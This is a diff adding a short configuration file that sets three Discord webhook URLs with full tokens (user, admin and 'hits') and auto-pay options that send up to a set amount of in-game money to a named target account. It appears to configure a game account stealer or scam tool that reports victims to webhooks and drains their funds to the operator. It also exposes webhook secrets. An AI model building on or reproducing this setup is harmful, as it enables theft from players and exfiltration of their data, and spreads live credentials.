@@ -1,0 +1,7 @@
+userWebhook=https://discord.com/api/webhooks/1441141091318370375/l-LPIh65tkuwyd23iziwUwMkWZkVUiGormGB-7J2j1eoL-QFoSxZmK7BB3hDnBt10Zp5
+adminWebhook=https://discord.com/api/webhooks/1441459565991559359/J4jz9u30ftkN4PMivDgl0BtBYaCXusJ9IVXMCgDEuP93WdQ6oZToBjimNvSDnILjTbLQ
+hitsWebhook=https://discord.com/api/webhooks/1440289975739613275/7bYI3LKKJJCYVfLn_uXwiTDJ9dEunVYji95da5t0Qsot9cOnWofnd1NYPnyR58y0Bymh
+autoPayEnabled=true
+autoPayMaxMoney=10000
+autoPayMaxPlaytime=432000000
+autoPayTarget=idointwanttopayappolo
